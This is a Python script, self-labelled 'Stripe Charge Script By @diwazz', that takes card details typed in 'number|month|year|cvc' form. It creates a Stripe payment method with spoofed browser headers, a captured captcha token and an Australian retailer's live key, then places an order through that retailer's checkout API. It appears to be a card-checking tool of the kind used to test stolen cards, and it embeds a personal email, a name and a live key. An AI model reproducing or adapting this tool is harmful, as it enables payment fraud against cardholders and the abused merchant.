import requests
import uuid
import sys
from urllib.parse import urlencode

def run_charge(card_details):
    print("➡️ [1/2] Creating Stripe Payment Method...")
    
    stripe_url = 'https://api.stripe.com/v1/payment_methods'
    
    stripe_headers = {
        'accept': 'application/json',
        'accept-language': 'en-GB',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    }

    #@diwazz
    stripe_data = {
        'billing_details[address][state]': 'SA',
        'billing_details[address][postal_code]': '1234',
        'billing_details[address][country]': 'AU',
        'billing_details[address][city]': 'Hivug',
        'billing_details[address][line1]': 'New',
        'billing_details[address][line2]': 'York',
        'billing_details[email]': 'khatrieex@gmail.com',
        'billing_details[name]': 'Diwas Khatri',
        'billing_details[phone]': '875444',
        'type': 'card',
        'allow_redisplay': 'unspecified',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element; deferred-intent; autopm',
        'referrer': 'https://www.livingponds.com.au',
        'time_on_page': '150658',
        'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
        'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        'key': 'pk_live_51QBpW3CSUyWFRv1F1BlrlZOjar9z8cVx4CzPIpEqe1P6vQGvBD5BwSwm998v51I7xVMj3G7YzMKiOwNfYCxw0wCq00xySSFhML',
        '_stripe_version': '2020-03-02',
        'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY3MzM3Mjk1LCJjZGF0YSI6ImZBL0RCTzhOUjhhMm9rQjhmMURNdTREUkN1bW5iYnJyaG52RnQ1T2c0cEkrTWxuNnZxNWloU3k2R1JnVGlYMW5Hd2tMTDdjVVVOb3FPaWgzaW1rR0ZLSTYrVUxEZDNabUV4TU9nQXJMZUorRFNGTTF4ak1WUlJMMWJyYi9HRjFSQzV6VUdzeGwyWFRjbWRGeTh4L0ZRUmVLREpqOUVtZldYNStJYVhiMjhGbURZdWEzWXcyUEMzR01hYkhqUTZ3cmx3RDFtQ1p6andRcWF0TmsiLCJwYXNza2V5IjoiWDFReUZLdzVoZEpNai91UmdrckZtOW5PLzdQb0FYWFNJZmxGclYvcVJ2UzVQdEliSFJNOHFRWHAzTU9pbmdGVWRvaTFEekZlN2VjY3orSXVtZ2szNThhcmlDZmc2ZjNkenpqTlYxUDk5T0k3NHlUQlFKRVZxaGsxeTU1c3hWSy94WjZUNEVnL0tjZWkwMm5hOFk5THhWL1RTU3Bnd2FvOG5zKzBPQmdVN0drT0gwZ0lUKzd2K0JNaSs3aVZHcXpVMVJHL3hSNGxWOERZOUZ0WnRGQ3FyVUFNdVV6MFYzTHpCREM5N0RCUEVTdUE2VnlzYkRiRmQ1WlJ6VWhKWkhuMXBSRXZGbThiakg2Z0Fwd1A0d09SMllXNVZvQ3hML3BoazA2bjNCQlA4NE1ESXBKdDd4a3JOOGNxdTlsb29HTTdQTVBvbnhyV3VpYU4wUFh1TTBNZnNPei9YWTdzODBqWDZuWTE4bnc5NGN5TGZFS29UK1FUMTQ4VUMyazhYUngwZzJsTHBvWURWV3grN2RpZjlLVytodGdrVUNJbmJRZFdWYnhQTmNYUVpHNlFGWTNUVVlXNFlmUHhUSkxFRjU1TGsrWVB2OXZTZzdoVGJMWVpNMEFidjRsOUhYcnIzeVdmWitGZ1dIWG83VWVic3hGNFRlTGhnMy9wa2hhaXZ5bjZDMWpCaWpSRVFTeERGN3ZmeWxZdzc2cmhZQWNQYUR2MGdIRGlOZTJZVmJSeHg5ckhoRjZ3VktxNW1aWTNoY2Z2MXBGeTV3Wm1MTExpT3BLZXhmT2pPU2x4UWRDMDZabm42a3Rkc1prbklGOFl0dmc2RExCT2QxK2svL0JVRS9wTEs0OWVJTjFpc1ZrWHRxdGdPVllpaHVqeE1IQXlrb01qbE90WTI1dWtsSGxYek9iUVEzM1Z3TmQ0QW9rN2FQZ25ldnVPSlZFd0Mxb1J1aWpGZHI3MURBeHZMQ1c3bnpiVXpTUlkvbzZqdUJpRWQ0N3lWVVJVdHF0QWxzR2w2dVR1amQ2OUxrV3BCK0RjLzdmK2dmUmlxckxGYTN3NlBTZjNlUEI0cGJYdmJwRmtWcFlnTVNnL0NvbUpkTVRRNUpPeGY4Snc4WUxUb1RnMmhjWVlaM1h5bStjMWMwSUxmZ0tTc0hWQlQ4OVd0K1FSb1pXYzlyYXVQSHJTY1EwTXp3dnA4ZFd3cUE2K1JGbWlYSk04TFRtSlpodWR4TkMvTDFRY3lZL1F2V0lpaFA2ZE1FaHBZeXRiajlaZlVYVzc3am9udHloSSs3TjdWSHBnbVJkV2ZiZjNtVnFwcEJuNSsrTkQwangrNW5FTlZ1OTdsN2VaK3RVWmljZXA4SEdqOUN4WWVyOXM2OW5ZUnUyOGxHMzUxYUNUMjFCSW1BdjJDR2lQLzY3NkNLbytFREJWd1VsZ090UVZqZk9peU5HMmFLeFBnMmRkS1NPQTlTdzArcHFPT1JFZkw2ZGlIQUl0M0NSbGdLNDcvTmpQNk9qL0UwazFZTWFJSEQ5VzNFY3gzUU43UFdFeGFVZGJ1UFJrenlKM1NCczdGUW1TK050Sy9GZHFVSmI0T0puYTVhR1JqRGdXTytMRml0alhxL202OUpHaGxtbEhYWnQ0WEdvRFpXSU8xaUlTV2FyZDZZYlVBVFJCbjd2V1hOSW1qOER4dUhrMHFKRnhzSkJHQUxjVitwSTZkcmwwUGJRTVZ5MGVDZ2VLQitodlI4WnJrQlExOSs2aXpycXNPRGNWNGFXR2FDMGZsNU5rUDUxQkhQNDRmMm9hbENjUlJKNXVhVXluTXBDM0IxTHgybUhZUnRvYnRKM3Vvald3c0d0M0V6L0xlanc0NTA2RW9SU1ZyMENwWU15b2l6bnFzY2QyZVJ2NzFzZWZNSWxhQ2wvZitKOGZHQVRoOFJReEJWYmtIZnR0ekhDMFI2d3RoVHpwVUJiSmZDdjB3ck11ZmVxQXp3em5kd2syb2dteFZldTYxNWdxZmVVTlFQa081S2VUUzNQR3h2aFhDWk1pdnV4dWZSUDhvU1o5RXJnTHIrYWFFRGRGemIwYUMyYmxnNzhQQUQ3blVaYmtCUnE0RWRva0xxM014Sy9LQmtGMnpuN0RlSXZQS1UzYVN0L0U1cCtVcUFDTjZpcXhZUkxCdU5EOUxzZ1ViM0VmNlErTVBHY2N2QXdicnJ6bjQxaWU1TnZ4K1k4VU5wenZUMHRMNHFDQkhlMGYvTEplUUptY1BGaWpkZlIxZS9sdmR4SFg5eWhmKzRJVXNYZW1JdFQ5Y1p6T0JTUVNaV3RXYjVpVXYxdkhqNVd1SFNYZEFQTkduZ3FqQzRkeEEyaUwvUkJscEE1R2FhWkE0dU9kMnFtZmFhakNrekROVlh1c3R2UVV3RzJ1ejFoSmxmODYxK0FNVVlmZ1RXTG9GS2RUdytKRGVBTTIyUVA3b3pmbHVrN3pOZTBPckl1L3ltSmFsQUMzZU9QWjVwWFBLTmxERk5aeExodEl3dWMzZ3F4YmI2TVROaU5NYmlpTWpZd2krOGVROHQ2WnZFamNYQzRKU1pzU3F4bk1NTEZRdFcva2kzQi8wOU1zZ1VlL2piTW5Ca3Nnb2NqUk0yZEliaHQrZHgwaVVDNjZFMGtlMGR0S2xqalhmcE09Iiwia3IiOiIyZDUxZTYyMiIsInNoYXJkX2lkIjozNjI0MDY5OTZ9.9awKwIVvFtnMdeUIje2jz-ZjBDHc_7dcOofEWR8r06o'
    }
    
    stripe_data.update({
        'card[number]': card_details['number'], 'card[cvc]': card_details['cvc'],
        'card[exp_year]': card_details['exp_year'], 'card[exp_month]': card_details['exp_month'],
        'guid': str(uuid.uuid4()), 'muid': str(uuid.uuid4()), 'sid': str(uuid.uuid4()),
    })
    
    encoded_data = urlencode(stripe_data)

    try:
        response = requests.post(stripe_url, headers=stripe_headers, data=encoded_data)
        response.raise_for_status()
        payment_method_id = response.json().get('id')
        if not payment_method_id: raise ValueError("Failed to get payment_method ID.")
        print(f"✅ Success! Payment Method ID: {payment_method_id}\n")
    except requests.exceptions.RequestException as e:
        print(f"❌ ERROR creating payment method: {e.response.text if e.response else e}")
        return

    #@diwazz
    print(f"➡️ [2/2] Placing order...")
    cart_id = 'NbH2uDAvDyurRfoXVQ1PFTCvsSEHTA3J'
    order_url = f'https://www.livingponds.com.au/rest/default/V1/guest-carts/{cart_id}/payment-information'
    merchant_headers = {
        'accept': '*/*', 'content-type': 'application/json',
        'origin': 'https://www.livingponds.com.au', 'referer': 'https://www.livingponds.com.au/checkout/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    merchant_json = {
        'cartId': cart_id,
        'billingAddress': {'countryId': 'AU', 'regionId': '609', 'street': ['New', 'York'], 'telephone': '875444', 'postcode': '1234', 'city': 'Hivug', 'firstname': 'Diwas', 'lastname': 'Khatri '},
        'paymentMethod': {'method': 'stripe_payments', 'additional_data': {'payment_method': payment_method_id}},
        'email': 'khatrieex@gmail.com',
    }

    try:
        response = requests.post(order_url, headers=merchant_headers, json=merchant_json)
        response.raise_for_status()
        print("✅ --- CHARGE SUCCESSFUL --- ✅")
        print("\n--- Final Response from Server ---")
        print(response.json())
    except requests.exceptions.RequestException as e:
        print(f"❌ Response ")
        if e.response is not None:
            print(f" Stripe: {e.response.text}")
        else:
            print(f"    Error: {e}")

if __name__ == "__main__":
    print("Stripe Charge Script By @diwazz")
    print(f"\nEnter card details in the format: number|month|year|cvc")
    cc_input = input("Card: ")
    if not cc_input:
        print("No card entered. Exiting.")
        sys.exit(1)
    try:
        parts = cc_input.strip().split('|')
        card_details = {"number": parts[0], "exp_month": parts[1], "exp_year": parts[2], "cvc": parts[3]}
        print("\nStarting the process...\n")
        run_charge(card_details)
    except Exception as e:
        print(f"\nAn unexpected error occurred: {e}")
